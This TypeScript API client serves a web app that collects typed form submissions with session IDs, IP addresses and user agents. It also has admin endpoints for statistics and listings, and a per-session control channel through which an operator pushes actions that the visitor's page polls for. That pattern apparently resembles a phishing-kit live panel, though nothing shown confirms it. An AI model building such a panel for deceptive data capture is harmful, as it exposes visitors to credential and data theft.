const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";

async function jsonRequest<T>(path: string, method: string, body?: unknown, token?: string): Promise<T> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }

  const baseUrl = API_BASE_URL.replace(/\/+$/, "");
  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
  const response = await fetch(`${baseUrl}${normalizedPath}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  const raw = await response.text();
  const data = raw ? JSON.parse(raw) : null;
  if (!response.ok) {
    throw new Error(data?.error || response.statusText || "Request failed");
  }

  return data as T;
}

export interface AdminLoginResponse {
  success: boolean;
  token: string;
}

export interface AdminStatsResponse {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

export interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

export interface SubmissionListResponse {
  submissions: SubmissionRow[];
  total: number;
  page: number;
  limit: number;
}

export async function submitSubmission(type: string, body: Record<string, unknown>) {
  return jsonRequest<{ id: number; sessionId: string }>(`/submissions/${type}`, "POST", body);
}

export async function adminLogin(username: string, password: string) {
  return jsonRequest<AdminLoginResponse>("/admin/login", "POST", { username, password });
}

export async function adminLogout(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout", "POST", undefined, token);
}

export async function adminLogoutAll(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout-all", "POST", undefined, token);
}

export async function adminChangePassword(token: string, newPassword: string) {
  return jsonRequest<{ success: boolean }>("/admin/change-password", "POST", { newPassword }, token);
}

export async function getAdminStats(token: string) {
  return jsonRequest<AdminStatsResponse>("/admin/stats", "GET", undefined, token);
}

export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
  const queryString = params ? `?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : "";
  return jsonRequest<SubmissionListResponse>(`/admin/submissions${queryString}`, "GET", undefined, token);
}

export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token);
}

export interface ControlActionResponse {
  action: string | null;
}

export async function getControlAction(sessionId: string) {
  return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
}

export async function sendAdminControl(sessionId: string, action: string, token: string) {
  return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
}
